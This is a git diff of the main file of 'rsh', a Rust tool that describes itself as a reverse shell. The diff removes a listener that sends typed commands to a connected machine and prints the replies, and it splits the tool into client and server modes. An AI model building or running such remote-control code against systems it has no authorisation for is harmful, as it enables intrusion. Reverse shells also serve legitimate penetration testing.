@@ -1,14 +1,16 @@
 use clap::Parser;
-use std::io::prelude::*;
-use std::net::{TcpListener, TcpStream};
-use colored::Colorize;
+mod client;
+mod server;
 
 #[derive(Parser)]
 #[command(name = "rsh")]
-#[command(author = "Sherlock Holmes, Simonfalke")]
+#[command(author = "Sherlock Holmes, Simonfalke, Canaris")]
 #[command(version = "0.0.1")]
 #[command(about = "A Rust reverse shell", long_about = None)]
+
 struct Config {
+	/// server/client
+	mode: String,
 	/// Port to operate on.
 	#[arg(default_value_t = 8080)]
 	port: i32,
@@ -17,56 +19,19 @@ struct Config {
 	ip: String,
 }
 
-fn send_message(stream: &mut TcpStream, message: &String) {
-	stream.write(message.as_bytes()).unwrap();
-	stream.flush().unwrap();
-}
-
-fn get_command() -> String {
-	let mut input = String::new();
-	std::io::stdin().read_line(&mut input).unwrap();
-
-	input
-}
-
-fn receive(stream: &mut TcpStream) -> String {
-	let mut data = String::new();
-
-	let mut buffer = [0; 512];
-	stream.read(&mut buffer).unwrap();
-	let mut converted = String::from_utf8_lossy(&buffer).to_string();
-	converted = converted.replace("\0", "");
-
-
-	// println!("{}", "pushed".green());
-	data.push_str(&converted.trim());
-
-	data
-}
-
-fn handle_client(mut stream: TcpStream) {
-	loop {
-		let command = get_command();
-		send_message(&mut stream, &command);
-		let mut data = receive(&mut stream);
-		data = data.replace("\0", "");
-		println!("{}", data);
-	}
-}
-
 fn main() {
-	let conf: Config = Config::parse();
-	let listener = TcpListener::bind(format!("{}:{}", conf.ip, conf.port.to_string())).unwrap();
-	println!("Listening at 127.0.0.1 on port {}", conf.port);
-	for stream in listener.incoming() {
-		match stream {
-			Ok(stream) => {
-				handle_client(stream);
-			}
-
-			Err(e) => {
-				println!("Error: {}", e);
-			}
-		}
+	let config = Config::parse();
+	if config.mode == "server" {
+		server::server(server::Config {
+			ip: config.ip,
+			port: config.port as u32,
+		});
+	} else if config.mode == "client" {
+		client::client(client::Config {
+			ip: config.ip,
+			port: config.port as u32,
+		});
+	} else {
+		println!("Invalid mode");
 	}
 }
